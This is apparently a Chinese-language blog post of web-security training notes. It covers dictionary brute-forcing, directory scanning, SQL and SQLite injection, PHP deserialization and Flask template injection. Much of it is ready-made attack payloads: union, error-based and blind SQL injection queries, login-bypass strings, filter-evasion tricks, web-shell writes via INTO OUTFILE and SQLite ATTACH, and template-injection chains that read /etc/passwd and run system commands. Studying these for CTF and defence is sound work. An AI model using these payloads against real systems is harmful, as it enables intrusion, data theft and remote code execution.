+++
categories = ['笔记']
tags = ['Web']
title = 'Web-12.9培训'
slug = 'Web-2024-12-9'
date = 2024-12-11T07:55:27+08:00
lastmod = 2024-12-11T07:55:27+08:00
draft = false
+++

## 字典爆破

目录/FUZZ/弱用户口令字典总结:

https://github.com/rootphantomer/Blasting_dictionary

https://github.com/TheKingOfDuck/fuzzDicts

https://github.com/zxcvbn001/password_brute_dictionary

kali-rockyou

## Web目录扫描

工具：御剑，ffuf，burpsuite

常用目录：

- /admin
- /admin.php
- /www.zip
- /src.izp
- /source.zip
- /.git
- /robots.txt
- /src

目录/FUZZ用户口令字典总结：

- https://github.com/rootphantomer/Blasting_dictionary
- https://github.com/TheKingOfDuck/fuzzDicts
- https://github.com/zxcvbn001/password_brute_dictionary
- kali-rockyou

## SQL注入

#### SQL注入过程：

1、判断是否存在注入点

2、字符型注入 or 数字型注入

3、有无回显；需要用到什么姿势：联合、报错、叠堆、盲注...

4、Bypass技巧

5、如何绕过waf

#### SQL注入联合查询常用payload：

> MYSQL规定联合注入的查询,union关键字连接的两个查询语句，查询的字段数必须保持一致

``` php
?id=-1'union select 1,database(),3 --+ 数据库名

?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+ 数据表名

?id=-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+ 列名 ?id=-1' union select 1,2,group_concat(username,password) from users--+ 数据

?name=1'and updatexml(1,concat(0x7e,(select database())),1)--+ 报错注入1

?name=1'and and extractvalue(1, concat('#', database()))# 报错注入2

?id=1' and ascii(substr((select database()),1,1))=115--+ 盲注——逐步对比法

?id=1' and ascii(substr((select database()),2,1))=102--+ 盲注——逐步对比法

1' and ascii(substr((select table_name from information_schema.tables where table_schema='{0}' limit {},1),{},1)) > {} --+".format(dbname,i,j,mid) 盲注——二分法

?id=-3')) union select 1,0x3c3f706870206576616c28245f524551554553545b315d293b3f3e,3 into outfile 'C:\\Users\\Administrator\\Desktop\\phpStudy\\WWW\\outfile.php' --+ 写shell
```

#### SQL注入常见参数

- user()：当前数据库用户

- database()：当前数据库名

- version()：当前使用的数据库版本

- @@datadir：数据库存储数据路径

- concat()：联合数据，用于联合两条数据结果。如 concat(username,0x3a,password)

- group_concat()：和 concat() 类似，如 group_concat(DISTINCT+user,0x3a,password)，用于把多条数据一次注入出来

- concat_ws()：用法类似

- hex() 和 unhex()：用于 hex 编码解码

- load_file()：以文本方式读取文件，在 Windows 中，路径设置为 \\

- select xxoo into outfile '路径'：权限较高时可直接写文件

#### SQL注万能密码

- admin' --

- admin' #

- admin'/*

- ' or 1=1--

- ' or 1=1#

- ' or 1=1/*

- ') or '1'='1--

- ') or ('1'='1--

- 以不同的用户登陆 ' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--

#### 常见bypass方法

``` php
if (stripos($sql, 'select') !== false) {
  throw new Exception('Invalid SQL query: SELECT statement not allowed');
}
// 执行查询语句
$result = $db->query($sql);
```

将select改为sElecT即可绕过。

``` php
$sql = str_ireplace('select', '', $sql); #str_ireplace()//不区分大小写
```

这时我们可以通过双写select把它变成seselectlect即可轻松绕过，因为最后sql里接收到的是去除了select的字符串，最后还是select。

两种关键字绕过的方法，用的都是注释符，比如用unio<>n代替union，用se/**/lect代替select

用十六进制形式替代引号，用from to替代盲注的逗号，用like和in替代等号，用符号绕过与或非

空格的绕过，有三种方法：

•编码绕过：%20 %09 %0a %0b %0c %0d %a0 %00

•内联注释：/**/ /*字符串*/

括号绕过：即添加括号代替空格，比如我们的正常语句为`SELECT 用户名 FROM sheet1`，现在我们就可以改成`SELECT(用户名)FROM(sheet1)`

#### SQLite注入常用语句

``` php
1' order by 3; 确定字段数

0' union select 1,2,sqlite_version(); 查版本、

0' union select 1,2,sql from sqlite_master; 查表名和字段名

0' union select 1,2,group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' -- 多条记录聚合

0' union select 1,2,group_concat(passwd) from user_data; 查数据

select * from test where id =1 union select 1,length(sqlite_version())=6 布尔盲注没有mid、left等函数

select * from test where id=1 and 1=(case when(substr(sqlite_version(),1,1)='3') then randomblob(1000000000) else 0 end); 用randomblob(N)代替sleep

';ATTACH DATABASE '/var/www/html/sqlite_test/shell.php' AS shell;create TABLE shell.exp (payload text); insert INTO shell.exp (payload) VALUES ('<?php @eval($_POST["x"]); ?>'); -- 写shell
```

## PHP反序列化

#### 相关概念

- 类 − 定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。

- 对象 − 是类的实例。

- 成员变量 − 定义在类内部的变量。该变量的值对外是不可见的，但是可以通过成员函数访问，在类被实例化为对象后，该变量即可成为对象的属性。

- 成员函数 − 定义在类的内部，可用于访问对象的数据。

- 原生类 − php语言中自带的类

- 魔术方法 - 是一种特殊的方法，像函数但又不是，当对对象执行某些操作时会覆盖 PHP 的默认操作。特征为'__'+字符串。

#### 序列化与反序列化

序列化可以将变量转换为字符串，并且在转换的过程中可以保存当前变量的值

`O:4:"Name":2:{s:8:"username";s:5:"admin";s:8:"password";s:3:"100";}`

反序列化可以将序列化生成的字符串转换回变量。

```
object(Name)#2 (2) {

 ["username"]=>

 string(5) "admin"

 ["password"]=>

 string(3) "100"
}
```

#### 类型

- 布尔型：`b:value => b:0`

- 整数型：`i:value => i:1`

- 字符串型：`s:length:value =>s:4 "aaaa"`

- 数组型：`a:<length>:{key, value pairs} =>a:1:{i:1;s:1 "a"}`

- 对象型：`O:<class_name_length>`

- NULL型：`N`

#### 魔术方法

``` php
__construct()，类的构造函数

__destruct()，类的析构函数

__call()，在对象中调用一个不可访问方法时调用

__callStatic()，用静态方式中调用一个不可访问方法时调用

__get()，获得一个类的成员变量时调用

__set()，设置一个类的成员变量时调用

__isset()，当对不可访问属性调用isset()或empty()时调用

__unset()，当对不可访问属性调用unset()时被调用

__sleep()，执行serialize()时，先会调用这个函数

__wakeup()，执行unserialize()时，先会调用这个函数

__toString()，类被当成字符串时的回应方法

__invoke()，调用函数的方式调用一个对象时的回应方法
```

## FLASK SSTI

``` py
//index.py
@app.route("/index/")
def test():
	content = request.args.get("content")
	return render template string(content)
```

`?content=<script>alert(/xss/)</script>` 导致XSS

`?content={{2+2}}` 导致ssti

在Jinja2模板引擎中，{{}}是变量包裹标识符。不仅仅可以传递变量，还可以执行简单的表达式

#### 常用表达式

__class__ 返回调用的参数类型

__bases__ 返回类型列表

__mro__ 此属性是在方法解析期间寻找基类时考虑的类元组

__subclasses__() 返回object的子类

__globals__ 函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价

**获取基本类：**

''.__class__.__mro__[2]

{}.__class__.__bases__[0]

().__class__.__bases__[0]

[].__class__.__bases__[0]

request.__class__.__mro__[9] 在flask的jinja2模块渲染可用

**获取基本类的子类：**

''.__class__.__mro__[2].__subclasses__()

**快速查找该引用对应的位置：**

''.__class__.__mro__[2].__subclasses__().index(file)

**调用（如file）并进行读写：**

''.__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read()

''.__class__.__mro__[2].__subclasses__()[40]("/root/test.txt", "a").write("123")

**找到重载过的__init__类，查看引用 __builtins__：**

''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']("/etc/passwd").read()

此处需要可以进行系统命令的类，例如os._wrap_close、warnings.catch_warnings等等

**命令执行：**

''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("whoami").read()')

[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.values()[144]('whoami')}

#### bypass

https://www.freebuf.com/articles/web/359392.html

https://blog.csdn.net/m0_73185293/article/details/131695528

https://blog.csdn.net/weixin_43995419/article/details/126811287

